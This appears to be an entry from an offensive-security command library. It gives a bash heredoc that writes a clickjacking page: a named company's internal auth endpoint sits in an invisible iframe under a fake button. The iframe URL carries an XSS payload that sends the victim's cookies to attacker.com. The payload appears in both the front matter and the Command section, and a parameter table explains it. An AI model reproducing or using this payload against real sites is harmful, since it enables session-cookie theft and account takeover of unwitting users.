---
id: cmd-create-clickjack-326449
data: >-
  cat > clickjack.html << EOF

  <!DOCTYPE html>

  <html><body>

  <iframe
  src="https://auth.uberinternal.com/oidauth/prompt?base=<script>document.location='https://attacker.com?'+document.cookie</script>"
  style="opacity:0; position:absolute; top:0; left:0; width:100%;
  height:100%;"></iframe>

  <div style="position:absolute; top:50%; left:50%;">Fake Button</div>

  </body></html>

  EOF
tags:
  - clickjacking
  - html-exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:34.194Z'
verified: false
validated: true
submitted: true
---
# create-clickjacking-page

## Command

```bash
cat > clickjack.html << EOF
<!DOCTYPE html>
<html><body>
<iframe src="https://auth.uberinternal.com/oidauth/prompt?base=<script>document.location='https://attacker.com?'+document.cookie</script>" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;"></iframe>
<div style="position:absolute; top:50%; left:50%;">Fake Button</div>
</body></html>
EOF
```

## Description

Creates an HTML file for clickjacking attack, embedding the vulnerable endpoint in an invisible iframe with XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cat > clickjack.html` | Redirects output to file | Yes |
| `<< EOF` | Heredoc for multi-line input | Yes |
| iframe src | URL with XSS payload | Yes |
| style attributes | Positions and hides iframe | Yes |

## Examples

### Basic Usage

```bash
cat > test-iframe.html << EOF
<!DOCTYPE html>
<html><body><iframe src="https://auth.uberinternal.com/oidauth/prompt?base=test" width="800" height="600"></iframe></body></html>
EOF
```

### Advanced Usage

```bash
cat > clickjack.html << EOF
... (full overlay with payload)
EOF
```

## Expected Output

HTML file created; open in browser to test embedding and click trigger.

## Related

- [[Related Procedure]]
